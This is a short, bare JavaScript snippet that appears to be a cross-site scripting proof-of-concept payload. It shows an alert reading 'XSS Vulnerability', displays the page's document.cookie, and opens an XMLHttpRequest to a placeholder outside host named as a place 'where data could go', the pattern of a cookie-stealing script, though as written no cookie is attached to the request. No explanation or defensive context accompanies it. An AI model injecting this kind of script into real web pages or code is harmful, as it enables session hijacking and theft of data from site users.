alert("XSS Vulnerability");
alert(document.cookie);
var xhr = new XMLHttpRequest(); 
xhr.open('GET', 'https://some-example-where-data-could-go.com/'); 
xhr.send();
